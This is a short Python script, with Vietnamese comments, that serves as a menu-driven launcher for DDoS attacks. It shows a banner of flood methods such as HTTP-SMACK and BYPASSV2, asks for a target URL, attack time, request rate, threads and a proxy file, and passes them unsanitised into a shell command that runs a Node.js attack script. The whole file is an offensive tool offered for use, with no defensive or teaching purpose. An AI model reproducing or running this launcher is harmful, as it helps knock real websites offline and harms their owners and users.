import subprocess
import subprocess
import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import requests
import time
import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os
osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
ascii = r'''

÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷
░██╗░░░░░░░██╗██╗░░██╗██╗████████╗███████╗÷  
░██║░░██╗░░██║██║░░██║██║╚══██╔══╝██╔════╝÷
░╚██╗████╗██╔╝███████║██║░░░██║░░░█████╗░░÷  
░░████╔═████║░██╔══██║██║░░░██║░░░██╔══╝░░÷  
░░╚██╔╝░╚██╔╝░██║░░██║██║░░░██║░░░███████╗÷  
░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚══════╝÷  
÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷
─────────█▄██▄█                                    
█▄█▄█▄█▄█▐█┼██▌█▄█▄█▄█▄█         
███┼█████▐████▌█████┼███             
÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷
METHOD || ATTACK SENT ❌
|| HTTPV3
|| HTTP-SMACK
|| TLSBESTREMAKE
|| BYPASSV2
÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷
                   
                           
 '''




banner = r"""
""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

 

 
print(Colorate.Horizontal(Colors.red_to_blue, banner))
def execute_command(method,target, time, request, thread, proxy_file):
    command = f'node {method}.js {target} {time} {request} {thread} {proxy_file}'
    subprocess.call(command, shell=True)

# Hàm main để lấy thông tin từ người dùng và gọi hàm execute_command
def main():
    target = input("Getar URL: ")
    method = input("Method: ")
    time = input("\Time Attack: ")
    request = input(" Star Rate: ")
    thread = input("📌THREADS: ")
    proxy_file = input("Name File Proxy: ")
    print("\033[1;93m⊂🚀⊃ GET ATTACK DDOS ⊂🚀⊃")
    execute_command(method,target, time, request, thread, proxy_file)

# Gọi hàm main để chạy công cụ
if __name__ == "__main__":
    main()
